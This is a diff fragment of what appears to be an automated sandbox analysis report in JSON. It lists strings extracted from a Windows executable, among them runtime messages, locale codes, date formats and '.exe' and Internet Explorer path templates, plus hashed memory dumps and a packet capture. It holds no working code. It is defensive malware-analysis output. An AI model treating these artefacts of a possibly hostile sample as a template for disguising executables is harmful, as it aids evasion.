+        "TLOSS error", 
+        "runtime error ", 
+        "Runtime Error!", 
+        "Program: ", 
+        "<program name unknown>", 
+        "Microsoft Visual C++ Runtime Library", 
+        "@ja-JP", 
+        "USER32.DLL", 
+        "zh-CHS", 
+        "az-AZ-Latn", 
+        "uz-UZ-Latn", 
+        "kok-IN", 
+        "syr-SY", 
+        "div-MV", 
+        "quz-BO", 
+        "sr-SP-Latn", 
+        "az-AZ-Cyrl", 
+        "uz-UZ-Cyrl", 
+        "quz-EC", 
+        "sr-SP-Cyrl", 
+        "quz-PE", 
+        "smj-NO", 
+        "bs-BA-Latn", 
+        "smj-SE", 
+        "sr-BA-Latn", 
+        "sma-NO", 
+        "sr-BA-Cyrl", 
+        "sma-SE", 
+        "sms-FI", 
+        "smn-FI", 
+        "zh-CHT", 
+        "az-az-cyrl", 
+        "az-az-latn", 
+        "bs-ba-latn", 
+        "div-mv", 
+        "kok-in", 
+        "quz-bo", 
+        "quz-ec", 
+        "quz-pe", 
+        "sma-no", 
+        "sma-se", 
+        "smj-no", 
+        "smj-se", 
+        "smn-fi", 
+        "sms-fi", 
+        "sr-ba-cyrl", 
+        "sr-ba-latn", 
+        "sr-sp-cyrl", 
+        "sr-sp-latn", 
+        "syr-sy", 
+        "uz-uz-cyrl", 
+        "uz-uz-latn", 
+        "zh-chs", 
+        "zh-cht", 
+        "Sunday", 
+        "Monday", 
+        "Tuesday", 
+        "Wednesday", 
+        "Thursday", 
+        "Friday", 
+        "Saturday", 
+        "January", 
+        "February", 
+        "August", 
+        "September", 
+        "October", 
+        "November", 
+        "December", 
+        "MM/dd/yy", 
+        "dddd, MMMM dd, yyyy", 
+        "HH:mm:ss", 
+        "         (((((                  H", 
+        "         (((((                  H", 
+        "                                 ", 
+        "CONOUT$", 
+        "Ajjjjjjjjh", 
+        "%s\\%s\\%s.exe", 
+        "\\Internet Explorer\\iexplore.exe", 
+        "\\Internet Explorer\\iexplore.exe", 
+        "%s\\%s\\%s.exe", 
+        "%s\\%s\\%s.exe"
+    ], 
+    "metadata": {
+        "output": {
+            "memdumps": [
+                {
+                    "basename": "2044-1.dmp", 
+                    "sha256": "8cf23248d8c7a52b13a9c1eddf0512009f768dc4fb212976e86f2128d1b1b361", 
+                    "dirname": "memory"
+                }, 
+                {
+                    "basename": "2044-2.dmp", 
+                    "sha256": "f51e607ebefb46b9bb120f05ec2051baad56325ed868924eaa619300632b033d", 
+                    "dirname": "memory"
+                }
+            ], 
+            "pcap": {
+                "basename": "dump.pcap", 
+                "sha256": "141ed7c2929c57cd7028c2383b8db3ac1b8a8be10639252fc44cb3215b4fe16b", 
+                "dirname": ""
+            }, 
+            "buffers": [
+                {
+                    "basename": "c806923cd74e6e61a5acf8fdc7eb23efce7a0fa0", 
+                    "sha256": "7b3420a03754049f4e08949093dca0cb3091c3199759ec6f2331e73bef294646", 
+                    "dirname": "buffer"
+                }
+            ]
+        }
+    }
+}
